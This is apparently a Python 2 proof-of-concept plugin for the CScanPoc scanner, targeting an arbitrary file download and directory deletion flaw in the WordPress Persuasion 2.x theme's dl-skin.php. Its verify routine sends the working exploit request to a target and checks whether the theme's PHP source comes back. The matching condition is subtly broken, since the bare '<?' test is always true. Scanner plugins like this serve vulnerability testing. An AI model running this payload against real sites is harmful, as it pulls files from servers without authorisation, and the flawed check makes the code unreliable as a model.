# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'WordPress_0052' # 平台漏洞编号，留空
    name = 'WordPress Theme Persuasion 2.x 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2013-12-23'  # 漏洞公布时间
    desc = '''
        The vulnerable file is located at http://vulnerable-site.com/wp-content/themes/persuasion/lib/scripts/dl-skin.php
        In exploit code, file name in first text box should be readable on the vulnerable server, then the vulnerable code allows it to be downloaded from the server. And the second textbox accepts a directory path. If it is writeable then vulnerable code will delete its contents.
        An attacker can download readable files from the server and also can delete contents of writeable directories.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/30443/'  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Theme Persuasion 2.x'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '223342bb-c4bb-4904-9795-a8cf863e583d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/wp-content/themes/persuasion/lib/scripts/dl-skin.php?_mysite_download_skin=dl-skin.php&_mysite_delete_skin_zip='
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if r.status_code == 200 and '<?' and '_mysite_delete_skin_zip' in r.content:
                #security_hole(verify_url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
